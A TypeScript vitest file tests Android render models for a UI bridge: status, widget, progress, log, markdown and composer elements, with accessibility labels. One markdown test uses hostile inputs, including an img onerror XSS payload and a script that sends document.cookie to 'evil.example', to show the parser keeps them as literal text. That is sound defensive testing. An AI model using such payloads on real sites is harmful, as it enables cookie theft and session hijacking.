import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import { describe, expect, it } from "vitest";

import { extensions } from "@picompanion/frontend-core";
import {
  PiUiElementSchema,
  type PiUiElement,
  type PiUiKind,
} from "@picompanion/protocol/pi-ui-bridge/schema";

import type { PiUiPayloadForKind } from "../registry";
import { buildComposerRenderModel } from "./composer-model";
import { buildElementActionModels } from "./element-actions-model";
import { DEFAULT_LOG_TAIL, buildLogRenderModel } from "./log-model";
import {
  buildMarkdownRenderModel,
  isSafeMarkdownHref,
  parseInline,
  type MdBlockNode,
} from "./markdown-model";
import { buildProgressRenderModel, clampProgressFraction } from "./progress-model";
import { buildStatusRenderModel } from "./status-model";
import { WIDGET_EMPTY_TEXT, buildWidgetRenderModel } from "./widget-model";

/**
 * T34A2 — Android `status`, `widget`, and `progress` kinds; extended by
 * T34A3 for `log`, `markdown`, and `composer`. Acceptance criteria
 * exercised here:
 *
 * - "All three render from the shared canonical fixtures": every element
 *   under test is the recorded element from
 *   `packages/protocol/src/fixtures/pi-ui-bridge/<kind>.json` — the same
 *   fixtures `@picompanion/frontend-core`'s normalize/state/action-controller
 *   tests replay — pushed through the real client-side canonical-payload
 *   normalizer (`extensions.normalizePiUiElementTyped`) rather than through
 *   a hand-written parallel fixture. Where a richer payload is needed, the
 *   recorded element is enriched with the exact v1 top-level fields a v1
 *   helper would have sent and normalized again, which is how
 *   `packages/frontend-core/src/extensions/normalize.test.ts` exercises the
 *   same fixtures.
 * - "Semantics match the web renderers": each assertion below states the
 *   value `apps/web/src/features/extensions/renderers/{status,widget,
 *   progress}.tsx` produces for the same element — fallback order, rows/
 *   lines/text precedence, tone mapping, clamping, and the action row's
 *   feedback wording.
 * - "TalkBack announces state": the accessibility props each renderer
 *   attaches (`accessibilityLabel`, `accessibilityLiveRegion`, and the
 *   grouped per-row utterance) are asserted here, on the RN-free models the
 *   components render straight from.
 *
 * **T34A3 addendum — fixture coverage is honestly partial for `log`/
 * `markdown`/`composer`.** Unlike `status`/`widget`/`progress` (every field
 * of those three payloads is optional, so the bare recorded fixture already
 * normalizes to a minimal-but-valid `{ kind }` payload), `log.lines`,
 * `markdown.text`, and `composer.text` are *required* fields
 * (`packages/protocol/src/pi-ui-bridge/payload.ts`). The recorded fixtures
 * for these three kinds carry the element envelope only (`ns`/`title`/`id`/
 * `actions`/`revision`) — no payload content — so
 * `extensions.normalizePiUiElementTyped` cannot derive a valid canonical
 * payload from them alone and leaves `element.payload` `undefined`
 * (verified directly against the real normalizer below, not asserted from
 * memory). Every payload-content assertion in this file's `log`/`markdown`/
 * `composer` suites therefore goes through the same `v1Fields` enrichment
 * parameter T34A2 established, supplying exactly the top-level fields a v1
 * helper would have sent (`lines`/`tail`/`mono` for `log`, `text` for
 * `markdown`/`composer`) before normalizing again — real normalizer, real
 * schema, recorded envelope; only the payload body is hand-supplied, and
 * that is stated here rather than implied.
 *
 * Two limits are worth stating plainly rather than working around:
 *
 * 1. The components themselves (`status.tsx`, `widget.tsx`, `progress.tsx`,
 *    `element-actions.tsx`) are *not* rendered here. Anything importing
 *    `react-native` fails to parse under this workspace's vitest
 *    (`RolldownError` on `node_modules/react-native/index.js:1:0`, a Flow
 *    type header) — see `../registry.test.ts`. Render proof belongs to the
 *    T37 Maestro flows.
 * 2. **On-device TalkBack announcement is unverified.** No emulator (and no
 *    `adb`) exists in this workspace, so what is proven here is that the
 *    correct accessibility props with the correct text reach the primitives;
 *    that a physical TalkBack session speaks them is a T37 on-device check.
 */

const here = dirname(fileURLToPath(import.meta.url));
const PI_UI_BRIDGE_FIXTURES_DIR = join(
  here,
  "../../../../../../packages/protocol/src/fixtures/pi-ui-bridge",
);

type FixtureFrame = { wireType: string; message: unknown };
type PiUiBridgeFixture = { kind: string; frames: FixtureFrame[] };

function loadPiUiBridgeFixture(kind: PiUiKind): PiUiBridgeFixture {
  const path = join(PI_UI_BRIDGE_FIXTURES_DIR, `${kind}.json`);
  return JSON.parse(readFileSync(path, "utf8")) as PiUiBridgeFixture;
}

/** Every `upsert` element recorded in a per-kind fixture's frames, in order. */
function recordedUpsertElements(fixture: PiUiBridgeFixture): Record<string, unknown>[] {
  const elements: Record<string, unknown>[] = [];
  for (const frame of fixture.frames) {
    if (!frame.wireType.includes("pi_ui_delta")) continue;
    const message = frame.message as {
      message?: { payload?: { event?: { delta?: { op?: string; element?: unknown } } } };
    };
    const delta = message.message?.payload?.event?.delta;
    if (delta?.op === "upsert" && delta.element) {
      elements.push(delta.element as Record<string, unknown>);
    }
  }
  return elements;
}

/**
 * The recorded element for `kind`, optionally enriched with the v1 top-level
 * fields a v1 helper would have sent, then run through the wire envelope
 * schema and the real client-side normalizer — i.e. exactly the element
 * `registry-view.tsx` hands a renderer.
 */
function fixtureElement(
  kind: PiUiKind,
  v1Fields: Record<string, unknown> = {},
  frameIndex = 0,
): PiUiElement {
  const recorded = recordedUpsertElements(loadPiUiBridgeFixture(kind))[frameIndex];
  expect(recorded).toBeDefined();
  const envelope = PiUiElementSchema.parse({ ...recorded, ...v1Fields });
  return extensions.normalizePiUiElementTyped(envelope);
}

/** The element's canonical payload, narrowed to its kind. */
function payloadOf<K extends PiUiKind>(element: PiUiElement, kind: K): PiUiPayloadForKind<K> {
  expect(element.payload).toBeDefined();
  expect(element.payload?.kind).toBe(kind);
  return element.payload as PiUiPayloadForKind<K>;
}

function idleState(): extensions.ExtensionActionState {
  return { status: "idle" };
}

function settledState(
  overrides: Partial<extensions.SettledExtensionAction> & {
    status: extensions.SettledExtensionAction["status"];
  },
): extensions.ExtensionActionState {
  return {
    target: {
      agentId: "agt_fixture_0001",
      namespace: "todo",
      elementId: "tasks",
      actionId: "expand",
    },
    requestId: "req_1",
    staleRevision: false,
    source: "response",
    settledAt: 0,
    ...overrides,
  };
}

describe("shared canonical fixtures (T34A2)", () => {
  it.each(["status", "widget", "progress"] as const)(
    "the recorded %s fixture normalizes to a canonical payload of its own kind",
    (kind) => {
      const element = fixtureElement(kind);
      expect(element.kind).toBe(kind);
      // The recorded fixtures carry envelope fields only, so normalization
      // derives the minimal-but-valid canonical payload (every field of
      // these three kinds' payloads is optional).
      expect(element.payload).toEqual({ kind });
    },
  );

  it("builds a render model for all three recorded fixtures without inventing text", () => {
    const status = fixtureElement("status");
    const widget = fixtureElement("widget");
    const progress = fixtureElement("progress");

    // Each model's primary text comes from the recorded element's own title
    // — the same fallback the web renderers apply when a payload carries no
    // text of its own.
    expect(buildStatusRenderModel(status, payloadOf(status, "status")).statusText).toBe(
      "Plan mode: reviewing changes",
    );
    expect(buildWidgetRenderModel(widget, payloadOf(widget, "widget")).title).toBe(
      "3 of 7 tasks complete",
    );
    expect(buildProgressRenderModel(progress, payloadOf(progress, "progress")).label).toBe(
      "Deploy workflow — step 2 of 5",
    );
  });
});

describe("status render model (T34A2)", () => {
  it("labels the indicator with the humanized namespace and falls back to the element title", () => {
    const element = fixtureElement("status");
    const model = buildStatusRenderModel(element, payloadOf(element, "status"));

    expect(element.ns).toBe("plan-mode");
    expect(model.label).toBe("Plan Mode");
    expect(model.statusText).toBe("Plan mode: reviewing changes");
    expect(model.tone).toBe("neutral");
    expect(model.detail).toBeUndefined();
    expect(model.actionsAccessibilityLabel).toBe("Plan Mode actions");
  });

  it("prefers the payload text over the title and maps the wire tone to a primitive tone", () => {
    const element = fixtureElement("status", {
      text: "Reviewing changes",
      detail: "3 files pending",
      tone: "accent",
    });
    const model = buildStatusRenderModel(element, payloadOf(element, "status"));

    expect(model.statusText).toBe("Reviewing changes");
    // `accent` -> `info`, the same mapping the web renderer's shared tone
    // table applies.
    expect(model.tone).toBe("info");
    expect(model.detail).toEqual({
      text: "3 files pending",
      accessibilityLabel: "Plan Mode detail: 3 files pending",
      accessibilityLiveRegion: "polite",
    });
  });

  it("falls back to a generic status word when neither payload nor envelope names one", () => {
    const model = buildStatusRenderModel({ ns: "plan-mode", title: undefined }, { kind: "status" });
    expect(model.statusText).toBe("Status");
  });

  it("maps every wire tone the same way the web renderer does", () => {
    const tones = ["default", "accent", "success", "warning", "error"] as const;
    const mapped = tones.map(
      (tone) => buildStatusRenderModel({ ns: "x" }, { kind: "status", tone }).tone,
    );
    expect(mapped).toEqual(["neutral", "info", "success", "warning", "danger"]);
  });
});

describe("widget render model (T34A2)", () => {
  it("renders labelled rows in preference to lines or text, with a tone chip and detail", () => {
    const element = fixtureElement("widget", {
      rows: [
        { id: "r1", label: "Build", value: "passing", tone: "success", detail: "12s" },
        { id: "r2", label: "Deploy", value: "blocked", tone: "warning" },
      ],
      lines: ["ignored"],
      text: "ignored",
    });
    const model = buildWidgetRenderModel(element, payloadOf(element, "widget"));

    expect(model.title).toBe("3 of 7 tasks complete");
    if (model.body.type !== "rows") throw new Error("expected a rows body");
    expect(model.body.rows).toEqual([
      {
        key: "r1",
        label: "Build",
        value: "passing",
        detail: "12s",
        toneChipLabel: "Success",
        tone: "success",
        accessibilityLabel: "Build: passing, Success, 12s",
      },
      {
        key: "r2",
        label: "Deploy",
        value: "blocked",
        detail: undefined,
        toneChipLabel: "Warning",
        tone: "warning",
        accessibilityLabel: "Deploy: blocked, Warning",
      },
    ]);
  });

  it("labels a row by id, then by position, when it carries no label", () => {
    const element = fixtureElement("widget", {
      rows: [{ id: "queue" }, { text: "value only" }],
    });
    const model = buildWidgetRenderModel(element, payloadOf(element, "widget"));
    if (model.body.type !== "rows") throw new Error("expected a rows body");

    expect(model.body.rows[0]?.label).toBe("queue");
    expect(model.body.rows[0]?.value).toBe("");
    expect(model.body.rows[0]?.accessibilityLabel).toBe("queue");
    // `row.text` stands in for `row.value`, exactly as on the web.
    expect(model.body.rows[1]?.label).toBe("Row 2");
    expect(model.body.rows[1]?.value).toBe("value only");
    expect(model.body.rows[1]?.key).toBe("1");
  });

  it("renders pre-split lines when there are no rows, and free text when there are neither", () => {
    const withLines = fixtureElement("widget", { lines: ["First line", "Second line"] });
    expect(buildWidgetRenderModel(withLines, payloadOf(withLines, "widget")).body).toEqual({
      type: "lines",
      lines: ["First line", "Second line"],
    });

    const withText = fixtureElement("widget", { text: "Everything looks fine." });
    expect(buildWidgetRenderModel(withText, payloadOf(withText, "widget")).body).toEqual({
      type: "text",
      text: "Everything looks fine.",
    });
  });

  it("explains an empty payload instead of rendering a blank card", () => {
    const element = fixtureElement("widget");
    const model = buildWidgetRenderModel(element, payloadOf(element, "widget"));

    expect(model.body).toEqual({ type: "empty", text: WIDGET_EMPTY_TEXT });
    expect(WIDGET_EMPTY_TEXT).toBe("No details provided.");
  });

  it("falls back to a generic widget title when the element has no title", () => {
    const model = buildWidgetRenderModel({ title: undefined }, { kind: "widget" });
    expect(model.title).toBe("Widget");
    expect(model.actionsAccessibilityLabel).toBe("Widget actions");
  });
});

describe("progress render model (T34A2)", () => {
  it("is indeterminate when the recorded fixture carries no value", () => {
    const element = fixtureElement("progress");
    const model = buildProgressRenderModel(element, payloadOf(element, "progress"));

    expect(model.label).toBe("Deploy workflow — step 2 of 5");
    expect(model.value).toBeNull();
    expect(model.fraction).toBeUndefined();
    expect(model.actionsAccessibilityLabel).toBe("Deploy workflow — step 2 of 5 actions");
  });

  it("converts value/max into a 0-1 fraction and a visible step count", () => {
    const element = fixtureElement("progress", { label: "Deploy workflow", value: 2, max: 5 });
    const model = buildProgressRenderModel(element, payloadOf(element, "progress"));

    expect(model.label).toBe("Deploy workflow");
    expect(model.value).toBeCloseTo(0.4);
    expect(model.fraction).toEqual({
      text: "2 of 5",
      accessibilityLabel: "Deploy workflow: 2 of 5",
      accessibilityLiveRegion: "polite",
    });
  });

  it("tracks the fixture's second recorded frame advancing the same element", () => {
    // `progress.json`'s second frame is an upsert of the same `ns:id` at a
    // later revision — the step-advance case the polite live region exists
    // for.
    const advanced = fixtureElement("progress", { value: 3, max: 5 }, 1);
    const model = buildProgressRenderModel(advanced, payloadOf(advanced, "progress"));

    expect(advanced.title).toBe("Deploy workflow — step 3 of 5");
    expect(model.value).toBeCloseTo(0.6);
    expect(model.fraction?.text).toBe("3 of 5");
  });

  it("treats an explicitly indeterminate payload as indeterminate but keeps a known step count", () => {
    const element = fixtureElement("progress", { value: 2, max: 5, indeterminate: true });
    const model = buildProgressRenderModel(element, payloadOf(element, "progress"));

    expect(model.value).toBeNull();
    expect(model.fraction?.text).toBe("2 of 5");
  });

  it("announces a detail line politely", () => {
    const element = fixtureElement("progress", {
      label: "Deploy workflow",
      value: 2,
      max: 5,
      detail: "Waiting on tests",
    });
    const model = buildProgressRenderModel(element, payloadOf(element, "progress"));

    expect(model.detail).toEqual({
      text: "Waiting on tests",
      accessibilityLabel: "Deploy workflow detail: Waiting on tests",
      accessibilityLiveRegion: "polite",
    });
  });

  it("clamps out-of-range and degenerate value/max pairs like the web renderer", () => {
    expect(clampProgressFraction(9, 5)).toBe(1);
    expect(clampProgressFraction(-1, 5)).toBe(0);
    // A `max` of 0 degenerates to 0 rather than NaN/Infinity.
    expect(clampProgressFraction(1, 0)).toBe(0);
    // With no `max` the value is already a fraction.
    expect(clampProgressFraction(0.25, undefined)).toBe(0.25);
    expect(clampProgressFraction(4, undefined)).toBe(1);
  });

  it("falls back to a generic progress label when nothing names the work", () => {
    expect(buildProgressRenderModel({ title: undefined }, { kind: "progress" }).label).toBe(
      "Progress",
    );
  });
});

describe("element action row model (T34A2)", () => {
  it("builds one secondary button per recorded action, idle and enabled", () => {
    const element = fixtureElement("widget");
    expect(element.actions).toEqual([{ id: "expand", label: "Expand" }]);

    const models = buildElementActionModels(element.actions, idleState);
    expect(models).toHaveLength(1);
    expect(models[0]).toMatchObject({
      id: "expand",
      label: "Expand",
      // No `variant` on the wire means `secondary`, as on the web.
      kind: "secondary",
      disabled: false,
      feedback: undefined,
    });
  });

  it("maps each wire variant to the same button role the web row uses", () => {
    const models = buildElementActionModels(
      [
        { id: "a", label: "A", variant: "primary" },
        { id: "b", label: "B", variant: "secondary" },
        { id: "c", label: "C", variant: "danger" },
        { id: "d", label: "D" },
      ],
      idleState,
    );
    expect(models.map((model) => model.kind)).toEqual([
      "primary",
      "secondary",
      "danger",
      "secondary",
    ]);
  });

  it("disables only the pending action and announces its progress politely", () => {
    const element = fixtureElement("widget");
    const models = buildElementActionModels(element.actions, (actionId) =>
      actionId === "expand"
        ? {
            status: "pending",
            target: {
              agentId: "agt_fixture_0001",
              namespace: "todo",
              elementId: "tasks",
              actionId,
            },
            requestId: "req_1",
            dispatchedAt: 0,
          }
        : idleState(),
    );

    expect(models[0]?.disabled).toBe(true);
    expect(models[0]?.feedback).toEqual({
      text: "Working…",
      accessibilityLabel: "Expand: Working…",
      accessibilityLiveRegion: "polite",
    });
  });

  it("announces every settled outcome with the web row's wording", () => {
    const states: extensions.ExtensionActionState[] = [
      settledState({ status: "success" }),
      settledState({ status: "rejected", error: "Extension refused" }),
      settledState({ status: "rejected" }),
      settledState({ status: "timeout", source: "timeout" }),
      settledState({ status: "cancelled", source: "cancel" }),
    ];

    const texts = states.map(
      (state) =>
        buildElementActionModels([{ id: "expand", label: "Expand" }], () => state)[0]?.feedback
          ?.text,
    );

    expect(texts).toEqual(["Done", "Extension refused", "Failed", "Timed out", "Cancelled"]);
  });

  it("renders no row at all for an element without actions", () => {
    const element = fixtureElement("status");
    expect(element.actions).toBeUndefined();
    expect(buildElementActionModels(element.actions, idleState)).toEqual([]);
    expect(buildElementActionModels([], idleState)).toEqual([]);
  });

  it("keeps a confirm-bearing action pressable — the confirm gate is the view's job", () => {
    const models = buildElementActionModels(
      [{ id: "wipe", label: "Wipe", variant: "danger", confirm: "This cannot be undone." }],
      idleState,
    );
    expect(models[0]?.disabled).toBe(false);
    // The wire action is carried back through so `dispatchAction` can apply
    // the §12.3 confirmation gate before anything is sent.
    expect(models[0]?.action.confirm).toBe("This cannot be undone.");
  });
});

describe("TalkBack announcement props (T34A2)", () => {
  /**
   * On-device announcement is unverified in this workspace (no emulator, no
   * `adb`). These assertions prove the props the components hand the §10.3
   * primitives, which is where TalkBack reads them from: `StatusIndicator`
   * (`accessibilityLiveRegion="polite"` + `"<label>: <status>"`) and
   * `Progress` (`accessibilityRole="progressbar"` + `accessibilityValue`)
   * already own the primary announcement for `status`/`progress`; every
   * secondary line this task adds is a polite live region with an explicit
   * label, and each widget row is one grouped utterance.
   */
  it("gives every secondary line an explicit label and a polite live region", () => {
    const status = fixtureElement("status", { detail: "3 files pending" });
    const progress = fixtureElement("progress", {
      label: "Deploy",
      value: 2,
      max: 5,
      detail: "Waiting",
    });
    const statusModel = buildStatusRenderModel(status, payloadOf(status, "status"));
    const progressModel = buildProgressRenderModel(progress, payloadOf(progress, "progress"));
    const [actionModel] = buildElementActionModels([{ id: "expand", label: "Expand" }], () =>
      settledState({ status: "success" }),
    );

    for (const announced of [
      statusModel.detail,
      progressModel.fraction,
      progressModel.detail,
      actionModel?.feedback,
    ]) {
      expect(announced).toBeDefined();
      expect(announced?.accessibilityLiveRegion).toBe("polite");
      expect(announced?.accessibilityLabel.length).toBeGreaterThan(0);
      // The announced label always names what changed, not just the value.
      expect(announced?.accessibilityLabel).toContain(announced?.text ?? "");
    }
  });

  it("folds a widget row into one utterance rather than three fragments", () => {
    const element = fixtureElement("widget", {
      rows: [{ label: "Build", value: "passing", tone: "success", detail: "12s" }],
    });
    const model = buildWidgetRenderModel(element, payloadOf(element, "widget"));
    if (model.body.type !== "rows") throw new Error("expected a rows body");

    const [row] = model.body.rows;
    expect(row?.accessibilityLabel).toBe("Build: passing, Success, 12s");
    // Tone reaches the user as a visible, announced chip label — never
    // colour alone (plan.md §10.5).
    expect(row?.toneChipLabel).toBe("Success");
  });
});

describe("shared canonical fixtures (T34A3 — log/markdown/composer)", () => {
  it.each(["log", "markdown", "composer"] as const)(
    "the bare recorded %s fixture leaves payload undefined — its required field(s) are not in the envelope",
    (kind) => {
      const element = fixtureElement(kind);
      expect(element.kind).toBe(kind);
      // Unlike status/widget/progress, log.lines/markdown.text/composer.text
      // are required fields the wire schema cannot default, so the bare
      // envelope fails schema validation and normalizePiUiElement returns
      // the input unchanged (see this file's T34A3 addendum comment above).
      expect(element.payload).toBeUndefined();
    },
  );

  it("builds a render model for all three once the required field is supplied via v1Fields enrichment", () => {
    const log = fixtureElement("log", { lines: ["Booting advisor…", "Reviewing changes"] });
    const markdown = fixtureElement("markdown", { text: "# Notes\nSynthetic body." });
    const composer = fixtureElement("composer", { text: "Synthetic rewritten prompt" });

    expect(buildLogRenderModel(log, payloadOf(log, "log")).title).toBe("Advisor activity log");
    expect(buildMarkdownRenderModel(markdown, payloadOf(markdown, "markdown")).title).toBe(
      "BTW: design review notes",
    );
    expect(buildComposerRenderModel(composer, payloadOf(composer, "composer")).title).toBe(
      "Composer replacement suggested",
    );
  });
});

describe("log render model (T34A3)", () => {
  it("shows every line unmodified when the total is within the tail cap", () => {
    const element = fixtureElement("log", { lines: ["one", "two", "three"] });
    const model = buildLogRenderModel(element, payloadOf(element, "log"));

    expect(model.title).toBe("Advisor activity log");
    expect(model.mono).toBe(true);
    expect(model.visibleLines).toEqual(["one", "two", "three"]);
    expect(model.totalLines).toBe(3);
    expect(model.hiddenCount).toBe(0);
    expect(model.truncatedNotice).toBeUndefined();
    expect(model.emptyText).toBeUndefined();
    expect(model.scrollAccessibilityLabel).toBe("Advisor activity log output");
    expect(model.actionsAccessibilityLabel).toBe("Advisor activity log actions");
  });

  it("bounds the log to the bridge contract's default tail of 200 lines when the payload names no tail", () => {
    expect(DEFAULT_LOG_TAIL).toBe(200);
    const lines = Array.from({ length: 250 }, (_, i) => `line ${i + 1}`);
    const element = fixtureElement("log", { lines });
    const model = buildLogRenderModel(element, payloadOf(element, "log"));

    expect(model.visibleLines).toHaveLength(200);
    // The oldest 50 lines are dropped; the newest 200 remain, in order.
    expect(model.visibleLines[0]).toBe("line 51");
    expect(model.visibleLines[model.visibleLines.length - 1]).toBe("line 250");
    expect(model.totalLines).toBe(250);
    expect(model.hiddenCount).toBe(50);
    expect(model.truncatedNotice).toBe("Showing last 200 of 250 lines (50 earlier lines hidden).");
  });

  it("honours the payload's own tail hint over the default", () => {
    const lines = Array.from({ length: 10 }, (_, i) => `line ${i + 1}`);
    const element = fixtureElement("log", { lines, tail: 3 });
    const model = buildLogRenderModel(element, payloadOf(element, "log"));

    expect(model.visibleLines).toEqual(["line 8", "line 9", "line 10"]);
    expect(model.hiddenCount).toBe(7);
    expect(model.truncatedNotice).toBe("Showing last 3 of 10 lines (7 earlier lines hidden).");
  });

  it("singularizes the truncation notice for exactly one hidden line", () => {
    const element = fixtureElement("log", { lines: ["a", "b"], tail: 1 });
    const model = buildLogRenderModel(element, payloadOf(element, "log"));
    expect(model.truncatedNotice).toBe("Showing last 1 of 2 lines (1 earlier line hidden).");
  });

  it("explains an empty log instead of rendering a blank scroll region", () => {
    const element = fixtureElement("log", { lines: [] });
    const model = buildLogRenderModel(element, payloadOf(element, "log"));
    expect(model.visibleLines).toEqual([]);
    expect(model.emptyText).toBe("No output yet.");
  });

  it("opts out of monospace only when the payload explicitly sets mono: false", () => {
    const mono = fixtureElement("log", { lines: ["x"], mono: true });
    expect(buildLogRenderModel(mono, payloadOf(mono, "log")).mono).toBe(true);
    const plain = fixtureElement("log", { lines: ["x"], mono: false });
    expect(buildLogRenderModel(plain, payloadOf(plain, "log")).mono).toBe(false);
    const unset = fixtureElement("log", { lines: ["x"] });
    expect(buildLogRenderModel(unset, payloadOf(unset, "log")).mono).toBe(true);
  });

  it("falls back to a generic log title when the element has no title", () => {
    const model = buildLogRenderModel({ title: undefined }, { kind: "log", lines: [] });
    expect(model.title).toBe("Log");
    expect(model.actionsAccessibilityLabel).toBe("Log actions");
  });
});

/** Every paragraph/heading inline node, and every text node inside a blockquote, joined depth-first. */
function collectInlineTypes(blocks: readonly MdBlockNode[]): string[] {
  const types: string[] = [];
  for (const block of blocks) {
    if (block.type === "paragraph" || block.type === "heading") {
      for (const node of block.children) types.push(node.type);
    } else if (block.type === "blockquote") {
      types.push(...collectInlineTypes(block.children));
    }
  }
  return types;
}

/** Concatenates every literal `text` inline node's raw value, depth-first. */
function collectText(blocks: readonly MdBlockNode[]): string {
  let out = "";
  for (const block of blocks) {
    if (block.type === "paragraph" || block.type === "heading") {
      for (const node of block.children) {
        if (node.type === "text") out += node.value;
      }
    } else if (block.type === "blockquote") {
      out += collectText(block.children);
    }
  }
  return out;
}

describe("markdown render model (T34A3)", () => {
  it("parses headings, paragraphs, code fences, lists, quotes, and rules into a block AST", () => {
    const element = fixtureElement("markdown", {
      text: [
        "# Title",
        "",
        "A **bold** and *em* paragraph with `code` and a [link](https://example.com/synthetic).",
        "",
        "```ts",
        "const x = 1;",
        "```",
        "",
        "- one",
        "- two",
        "",
        "> quoted",
        "",
        "---",
      ].join("\n"),
    });
    const model = buildMarkdownRenderModel(element, payloadOf(element, "markdown"));

    expect(model.title).toBe("BTW: design review notes");
    expect(model.blocks.map((block) => block.type)).toEqual([
      "heading",
      "paragraph",
      "code-block",
      "list",
      "blockquote",
      "hr",
    ]);
  });

  it("falls back to no title when the element carries none, and labels actions generically", () => {
    const model = buildMarkdownRenderModel(
      { title: undefined },
      { kind: "markdown", text: "Body" },
    );
    expect(model.title).toBeUndefined();
    expect(model.actionsAccessibilityLabel).toBe("Markdown actions");
  });

  it("rejects an unsafe link scheme, keeping the literal source text instead of a navigable link", () => {
    expect(isSafeMarkdownHref("https://example.com")).toBe(true);
    expect(isSafeMarkdownHref("mailto:synthetic@example.com")).toBe(true);
    expect(isSafeMarkdownHref("/relative/path")).toBe(true);
    expect(isSafeMarkdownHref("javascript:alert(1)")).toBe(false);
    expect(isSafeMarkdownHref("data:text/html,<script>alert(1)</script>")).toBe(false);

    const nodes = parseInline("[click me](javascript:evil)");
    expect(nodes).toEqual([{ type: "text", value: "[click me](javascript:evil)" }]);
  });

  it("never turns raw HTML embedded in the payload text into anything but a literal text node — hostile fixture", () => {
    const hostile = [
      '<img src=x onerror="alert(document.cookie)">',
      "<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>",
      '<a href="javascript:alert(1)">click</a>',
      "Plain <b>bold-looking</b> tag text that is not markdown.",
    ].join("\n\n");

    const element = fixtureElement("markdown", { text: hostile });
    const model = buildMarkdownRenderModel(element, payloadOf(element, "markdown"));

    // The parser recognizes exactly five inline node kinds
    // (text/strong/em/code/link — `markdown-model.ts`'s `MdInlineNode`
    // union) and none of them is a "raw"/"html" escape hatch, so every
    // node this hostile input produces is necessarily one of the five —
    // asserted here rather than assumed.
    const types = collectInlineTypes(model.blocks);
    expect(types.length).toBeGreaterThan(0);
    expect(types.every((type) => ["text", "strong", "em", "code", "link"].includes(type))).toBe(
      true,
    );
    // None of the hostile markup contains markdown's own emphasis/link
    // syntax, so it never becomes a "strong"/"em"/"link" node at all —
    // every one of these nodes is a literal "text" node.
    expect(types.every((type) => type === "text")).toBe(true);

    // The hostile markup survives only as literal characters: every
    // dangerous substring is still present, verbatim, inside a `text`
    // node's `value` — never executed, never parsed as an element, because
    // `markdown.tsx` maps `text` nodes onto React Native `Text` content,
    // never a `WebView` or any HTML-interpreting surface.
    const flattened = collectText(model.blocks);
    expect(flattened).toContain("<script>");
    expect(flattened).toContain("onerror=");
    expect(flattened).toContain('<a href="javascript:alert(1)">');
    expect(flattened).toContain("<b>bold-looking</b>");
  });
});

describe("composer render model (T34A3)", () => {
  it("labels the mode chip and carries the proposed text, defaulting to replace", () => {
    const element = fixtureElement("composer", { text: "Synthetic rewritten prompt" });
    const model = buildComposerRenderModel(element, payloadOf(element, "composer"));

    expect(element.ns).toBe("prompt-arbitrage");
    expect(model.title).toBe("Composer replacement suggested");
    expect(model.modeLabel).toBe("Replace draft");
    expect(model.proposedText).toBe("Synthetic rewritten prompt");
    expect(model.previousText).toBeUndefined();
    expect(model.actionsAccessibilityLabel).toBe("Composer replacement suggested actions");
  });

  it("maps every wire mode to the web renderer's exact label", () => {
    const modes = ["replace", "prefill", "append"] as const;
    const labels = modes.map((mode) => {
      const element = fixtureElement("composer", { text: "x", mode });
      return buildComposerRenderModel(element, payloadOf(element, "composer")).modeLabel;
    });
    expect(labels).toEqual(["Replace draft", "Prefill draft", "Append to draft"]);
  });

  it("carries the previous draft when the payload names one, including an explicitly empty draft", () => {
    const withPrevious = fixtureElement("composer", { text: "new", previousText: "old draft" });
    expect(
      buildComposerRenderModel(withPrevious, payloadOf(withPrevious, "composer")).previousText,
    ).toBe("old draft");

    const emptyPrevious = fixtureElement("composer", { text: "new", previousText: "" });
    expect(
      buildComposerRenderModel(emptyPrevious, payloadOf(emptyPrevious, "composer")).previousText,
    ).toBe("");
  });

  it("carries through the recorded fixture's accept/undo actions unchanged", () => {
    const element = fixtureElement("composer", { text: "x" });
    expect(element.actions).toEqual([
      { id: "accept", label: "Use suggestion", variant: "primary" },
      { id: "undo", label: "Undo", variant: "secondary" },
    ]);
  });

  it("falls back to a generic composer title when the element has no title", () => {
    const model = buildComposerRenderModel({ title: undefined }, { kind: "composer", text: "x" });
    expect(model.title).toBe("Composer suggestion");
    expect(model.actionsAccessibilityLabel).toBe("Composer suggestion actions");
  });
});
